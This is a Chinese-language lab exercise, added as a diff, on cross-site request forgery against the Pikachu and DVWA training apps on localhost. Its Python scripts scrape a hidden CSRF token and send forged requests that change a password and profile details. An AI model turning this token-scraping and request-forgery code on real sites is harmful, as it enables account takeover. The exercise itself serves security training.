@@ -1,0 +1,61 @@
+## 一、核心目标
+1.  实现从页面中自动提取隐藏CSRF Token的逻辑
+2.  编写批量发送无Token跨域请求的脚本，观察拦截响应
+3.  使用requests库携带Token构造合法请求，理解Token校验的作用
+
+---
+
+## 二、代码实现与逐行解析
+
+### 第1题：字符串处理——提取页面中隐藏CSRF Token值
+#从pikachu-CSRF token页面获取token值
+import requests
+url="http://127.0.0.1:9999/pikachu/vul/csrf/csrftoken/token_get_edit.php"
+headers={
+    "cookie":"PHPSESSID=ug41bpptplpd96uvv8hrtc7to0;security=low"
+}
+res=requests.get(url,headers=headers)
+res.encoding="utf-8"
+html=res.text
+start_str='token" value="'
+end_str='"'
+start_idx=html.find(start_str)+len(start_str)
+end_idx=html.find(end_str,start_idx)
+csrf_token=html[start_idx:end_idx]
+print("从pikachu页面提取到CSRF token:",csrf_token)
+
+### 第2题：循环请求——不带Token批量发送跨域请求（dvwa中实验,最终结果为至上而下最后一条URL参数修改的密码信息）
+import requests
+url_list=[
+    "http://127.0.0.1:9999/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#",
+    "http://127.0.0.1:9999/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#"
+]
+headers={
+    "cookie":"PHPSESSID=ug41bpptplpd96uvv8hrtc7to0;security=low"
+}
+for url in url_list:
+    resp=requests.get(url,headers=headers,timeout=8)
+    print(f"请求地址:{url}")
+    print(f"状态码:{resp.status_code}")
+    print(f"响应内容片段:{resp.text[:100]}")
+    print("-"*70)
+
+### 第3题：requests实战——携带抓取到的Token构造合法请求
+（1和3一起使用可获取token修改信息,这里验证了很多次,最后POST请求是无法成功的,然后发现了弊端修改为get型就成功修改了）
+import requests
+url="http://127.0.0.1:9999/pikachu/vul/csrf/csrftoken/token_get_edit.php"
+headers={
+    "Cookie":"PHPSESSID=ug41bpptplpd96uvv8hrtc7to0;security=low",
+}
+csrf_token="222206a01d712d5fcc252520686"
+params={
+    "sex":"boy",
+    "phonenum":"9999999",
+    "add":"shanghai",
+    "email":"test@test.com",
+    "token":csrf_token,
+    "submit":"submit"
+}
+res=requests.get(url,headers=headers,params=params)
+print(f"状态码:{res.status_code}")
+print(f"内容片段:{res.text[:200]}")
